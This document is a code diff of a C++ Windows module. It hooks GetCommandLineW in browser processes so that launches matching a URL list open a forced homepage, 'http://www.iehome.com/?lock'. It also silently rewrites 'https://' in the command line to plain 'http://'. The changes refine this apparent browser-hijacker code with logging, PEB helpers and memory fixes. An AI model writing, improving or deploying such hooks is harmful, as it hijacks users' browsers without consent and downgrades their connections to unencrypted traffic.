@@ -155,14 +155,28 @@ namespace {
 		return PPEB(__readfsdword(0x30));
 	}
 
+	inline PRTL_USER_PROCESS_PARAMETERS GetCurrentProcessParameters() {
+		PPEB pProcessPEB = GetCurrentProcessPEB();
+
+		if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
+			return NULL;
+		}
+
+		if (NULL == pProcessPEB->ProcessParameters->CommandLine.Buffer || NULL == pProcessPEB->ProcessParameters->ImagePathName.Buffer) {
+			return NULL;
+		}
+
+		return pProcessPEB->ProcessParameters;
+	}
+
 	int GetParentProcessId(DWORD dwProcessId)
 	{
 		LONG                      status = 0;
 		DWORD                     dwParentPID = 0;
-		PROCESS_BASIC_INFORMATION pbi = {0};
+		PROCESS_BASIC_INFORMATION pbi = { 0 };
 
 		PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess = (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");
-		
+
 		if (!NtQueryInformationProcess)
 			return -1;
 
@@ -199,7 +213,7 @@ namespace {
 			if (pe32.th32ProcessID == dwProcessID)
 			{
 				bIsFind = true;
-				wcscpy(pwszProcessName,pe32.szExeFile);
+				wcscpy(pwszProcessName, pe32.szExeFile);
 				break;
 			}
 
@@ -235,14 +249,17 @@ namespace {
 		pcre * pcreCompile = NULL;
 		int nWatchOvectors[MAX_OVECCOUNT] = { 0 };
 
-		char * pszCheckString = Common::WSTR2STR(pcwszCheckString,NULL);
+		char * pszCheckString = Common::WSTR2STR(pcwszCheckString, NULL);
 
 		int nErroroffset = 0;
 		const char * pcszErrorptr = NULL;
 
-		pcreCompile = pcre_compile("^\".:\\\\[^\"]*\" *$", PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);
+		pcreCompile = pcre_compile("^(?:\".|.):\\\\[^\"]+.exe\"? *$", PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);
 
 		if (pcreCompile && pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT) >= 0) {
+			free(pszCheckString);
+			pcre_free(pcreCompile);
+			Global::Log.PrintA(LOGOutputs, "[% 5u] Path Hit: %s", GetCurrentProcessId(), pszCheckString);
 			return true;
 		}
 
@@ -251,11 +268,14 @@ namespace {
 			pcreCompile = pcre_compile(ptszHitRedirectURLLists[i], PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);
 
 			if (pcreCompile && pcre_exec(pcreCompile, NULL, pszCheckString, strlen(pszCheckString), 0, 0, nWatchOvectors, MAX_OVECCOUNT) >= 0) {
+
 				bIsHit = true;
+				Global::Log.PrintA(LOGOutputs, "[% 5u] Host Hit: %s", GetCurrentProcessId(), ptszHitRedirectURLLists[i]);
 				break;
+
 			}
 		}
-		
+
 		free(pszCheckString);
 		pcre_free(pcreCompile);
 
@@ -287,68 +307,77 @@ namespace {
 
 LPWSTR WINAPI InlineGetCommandLineW(VOID)
 {
-	PPEB pProcessPEB = GetCurrentProcessPEB();
-
-	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
-		return pfnGetCommandLineW();
+	if (NULL != ustrCommandLine.Buffer) {
+		return ustrCommandLine.Buffer;
 	}
 
-	if (ustrCommandLine.MaximumLength < pProcessPEB->ProcessParameters->CommandLine.Length) {
+	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = GetCurrentProcessParameters();
 
-		ustrCommandLine.MaximumLength = max(pProcessPEB->ProcessParameters->CommandLine.Length, pProcessPEB->ProcessParameters->CommandLine.MaximumLength) + 1024;
+	if (NULL == pProcessParameters) {
+		return (NULL == pfnGetCommandLineW) ? L"" : pfnGetCommandLineW();
+	}
+
+	if (ustrCommandLine.MaximumLength < pProcessParameters->CommandLine.Length) {
+
+		ustrCommandLine.Length = 0;
+		ustrCommandLine.MaximumLength = max(pProcessParameters->CommandLine.Length, pProcessParameters->CommandLine.MaximumLength) + 1024;
+
+		if (NULL != ustrCommandLine.Buffer) {
+			HeapFree(GetProcessHeap(), 0, ustrCommandLine.Buffer);
+		}
 
 		ustrCommandLine.Buffer = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, sizeof(WCHAR) * ustrCommandLine.MaximumLength);
-
-		memcpy(ustrCommandLine.Buffer, pProcessPEB->ProcessParameters->CommandLine.Buffer, pProcessPEB->ProcessParameters->CommandLine.Length * sizeof(WCHAR));
 	}
 
-	LPWSTR pcwszStartCommandLine = ustrCommandLine.Buffer;
-	LPWSTR pcwszStartImagePathName = pProcessPEB->ProcessParameters->ImagePathName.Buffer;
+	if (NULL != ustrCommandLine.Buffer) {
+		ustrCommandLine.Length = pProcessParameters->CommandLine.Length;
+		memcpy(ustrCommandLine.Buffer, pProcessParameters->CommandLine.Buffer, pProcessParameters->CommandLine.Length * sizeof(WCHAR));
+	}
 
-	for (LPCWSTR pcwszNextOffset = wcsistr(ustrCommandLine.Buffer,_W("https://")); pcwszNextOffset != NULL; pcwszNextOffset = wcsistr(pcwszNextOffset, _W("https://")))
+	for (LPCWSTR pcwszNextOffset = wcsistr(ustrCommandLine.Buffer, _W("https://")); pcwszNextOffset != NULL; pcwszNextOffset = wcsistr(pcwszNextOffset, _W("https://")))
 	{
 		memmove((LPWSTR)&pcwszNextOffset[4], &pcwszNextOffset[5], wcslen(pcwszNextOffset) * sizeof(WCHAR));
 	}
 
 	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
+	LPWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
 
 	if (IsRedirectCommandLine(pcwszStartCommandLine)) {
 		pcwszStartCommandLine = ustrCommandLine.Buffer;
-		_swprintf(ustrCommandLine.Buffer, L"\"%s\" %s", pcwszStartImagePathName, pcwszNewParameter);
+		_swprintf(ustrCommandLine.Buffer, L"\"%s\" %s", pProcessParameters->ImagePathName.Buffer, pcwszNewParameter);
 	}
 
-	Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect EXEC: %s", GetCurrentProcessId(), pcwszStartCommandLine);
+	Global::Log.PrintW(LOGOutputs, L"[% 5u] New CMD: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 	return pcwszStartCommandLine;
 }
 
 bool Hook::StartCommandLineHook()
 {
 	bool bIsHook = false;
-	PPEB pProcessPEB = GetCurrentProcessPEB();
+	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = GetCurrentProcessParameters();
 
-	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
+	if (NULL == pProcessParameters) {
 		return false;
 	}
 
 	for (int i = 0; i < count(ptszHitProcessNameLists); i++) {
-		if (NULL != wcsistr(pProcessPEB->ProcessParameters->ImagePathName.Buffer, ptszHitProcessNameLists[i])) {
-
+		if (NULL != wcsistr(pProcessParameters->ImagePathName.Buffer, ptszHitProcessNameLists[i]) && NULL == pfnGetCommandLineW) {
 			bIsHook = HookControl::InlineHook(::GetCommandLineW, InlineGetCommandLineW, (void **)&pfnGetCommandLineW);
 			break;
 		}
 	}
 
-	Global::Log.PrintW(LOGOutputs, L"[% 5u] EXEC: [%u]%s", GetCurrentProcessId(), bIsHook, pProcessPEB->ProcessParameters->CommandLine.Buffer);
+	Global::Log.PrintW(LOGOutputs, L"[% 5u] CMD: [%u]%s", GetCurrentProcessId(), bIsHook, pProcessParameters->CommandLine.Buffer);
 
 #ifdef _DEBUG
 	IsRedirectCommandLine(L"\"C:\\Program Files(x86)\\Google\\Chrome\\Application\\chrome.exe\" ");
 #endif
 
 	LPCWSTR pcwszNewParameter = NULL;
-	LPCWSTR pcwszStartCommandLine = pProcessPEB->ProcessParameters->CommandLine.Buffer;
-	LPCWSTR pcwszStartImagePathName = pProcessPEB->ProcessParameters->ImagePathName.Buffer;
+	LPCWSTR pcwszStartCommandLine = pProcessParameters->CommandLine.Buffer;
+	LPCWSTR pcwszStartImagePathName = pProcessParameters->ImagePathName.Buffer;
 
-	if (NULL != wcsistr(pcwszStartImagePathName,_W("\\iexplore.exe")) && IsRedirectCommandLine(pcwszStartCommandLine)) {
+	if (NULL != wcsistr(pcwszStartImagePathName, _W("\\iexplore.exe")) && IsRedirectCommandLine(pcwszStartCommandLine)) {
 		pcwszNewParameter = L"http://www.iehome.com/?lock";
 	}
 
